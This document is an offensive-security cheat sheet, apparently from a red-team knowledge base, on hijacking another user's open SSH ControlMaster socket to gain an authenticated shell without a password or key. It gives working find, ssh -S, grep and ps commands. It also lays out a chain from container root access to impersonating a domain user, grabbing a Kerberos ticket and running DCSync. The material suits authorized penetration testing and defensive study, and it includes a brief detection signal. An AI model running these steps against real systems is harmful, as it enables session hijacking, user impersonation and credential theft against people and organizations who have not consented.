# SSH ControlMaster Socket Hijack (pivot primitive)

## When this applies

- A Linux foothold gives you root in a container/host that has SSH multiplex sockets in `~/.ssh/sockets/` or `~/.ssh/controlmaster/` left by another user's open sessions.
- Goal: ride the open session **without password or key**.

## Technique

The hijacking session inherits whatever credentials/agent the multiplex master holds — including Kerberos TGTs in `/tmp/krb5cc_<uid>` if the master was a domain user.

## Steps

```bash
# Find sockets
find / -path '*/sockets/*' -type s 2>/dev/null
find / -path '*controlmaster*' -type s 2>/dev/null
find /root /home -name '*.sock' -path '*ssh*' 2>/dev/null

# Use the existing session — note no -i key, no password prompt
ssh -S /root/.ssh/controlmaster/<user>@<host>:22 <user>@<host>

# The socket name format is typically <user>@<host>:<port> but check ssh_config:
grep -E 'ControlPath|ControlMaster' /etc/ssh/ssh_config /root/.ssh/config 2>/dev/null
```

## Useful chain

Container RCE as root → find socket left by a domain workstation user → SSH onto domain workstation as that user → grab Kerberos TGT → DCSync / ADFS / etc.

## Verifying success

- `ssh -S <socket> ...` lands an authenticated shell on the remote host as the multiplex-master user.
- `id` confirms the impersonated identity; `klist` may show a cached TGT inheritable for AD pivots.

## Detection / cleanup signal

The master process is usually `ssh -M -S <socket> -fN <user>@<host>`; its presence in `ps -eo pid,user,cmd | grep ssh` confirms a hijackable session.

## Common pitfalls

- Socket name format differs across distributions/configs — always read `~/.ssh/config` and `/etc/ssh/ssh_config` for `ControlPath` to know the naming.
- The socket is bound to a specific user/host pair — you cannot use it for other targets.

## Tools

- ssh
- find
- ps
